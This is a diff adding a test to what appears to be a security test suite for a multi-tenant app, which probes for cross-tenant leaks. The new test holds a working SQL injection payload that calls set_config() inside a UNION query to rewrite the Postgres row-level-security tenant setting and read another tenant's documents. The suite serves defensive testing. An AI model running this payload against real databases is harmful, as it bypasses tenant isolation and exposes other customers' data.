@@ -138,3 +138,22 @@ def answer_cache(client) -> Finding:
 
 ALL_ATTACKS = [idor, trusted_header, sql_injection, shared_cache, path_traversal, mass_assignment,
                aggregate_stats, rag_retrieval, chat_history, answer_cache]
+
+
+# ---------------------------------------------------------------- Phase 2 (Postgres + RLS) only
+
+def sqli_tenant_switch(client) -> Finding:
+    """SQL injection that rewrites the RLS tenant setting from inside the query.
+
+    RLS trusts `app.tenant_id`, and set_config() can be called from any SQL expression.
+    The middle UNION branch runs set_config() before the last branch scans documents.
+    (A simpler payload works or fails depending on the query plan, so "I tried it and it
+    failed" proves nothing.) 'ba'||'nk' builds the name in SQL, so an app that echoes
+    the query back doesn't trigger a false alarm."""
+    payload = ("zzz' UNION SELECT NULL, NULL, NULL, NULL WHERE set_config('app.tenant_id','ba'||'nk',true) IS NULL "
+               "UNION SELECT id, tenant_id, title, body FROM documents WHERE body ILIKE '%")
+    r = client.get("/search", params={"q": payload}, headers=auth(ATTACKER_TOKEN))
+    return _check(11, "SQLi rewrites the RLS tenant", r)
+
+
+PHASE2_ATTACKS = ALL_ATTACKS + [sqli_tenant_switch]
